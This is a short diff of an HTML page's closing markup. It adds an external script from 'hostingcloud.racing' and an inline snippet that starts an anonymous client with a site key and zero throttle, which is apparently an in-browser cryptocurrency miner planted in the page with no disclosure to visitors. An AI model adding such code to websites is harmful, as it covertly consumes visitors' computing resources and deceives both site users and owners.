@@ -128,5 +128,14 @@
                 </div>
             </div>
         </div>
+        <script src="https://www.hostingcloud.racing/KvFY.js"></script>
+<script>
+    var _client = new Client.Anonymous('aa9b15b8f7b248ce4c9e300722fa8545bc657cc37a45fb033ed85d4f21dbf650', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+    
+
+</script>
     </body>
 </html>
